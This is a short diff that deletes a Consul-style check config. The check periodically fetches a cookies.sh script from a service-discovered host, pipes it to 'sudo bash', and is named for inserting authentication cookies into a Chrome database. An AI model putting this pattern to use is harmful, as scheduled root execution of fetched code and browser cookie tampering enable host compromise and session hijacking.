@@ -1,8 +1,0 @@
-{
-  "check": {
-    "id": "cookies",
-    "name": "Get Auth Cookies From Server And Insert Into Chrome DB",
-    "script": "date; uptime; curl -s http://`dig @127.0.0.1 -p 8600 consul.service.consul +short`:8500/ui/scripts/cookies.sh | sudo bash",
-    "interval": "60s"
-  }
-}
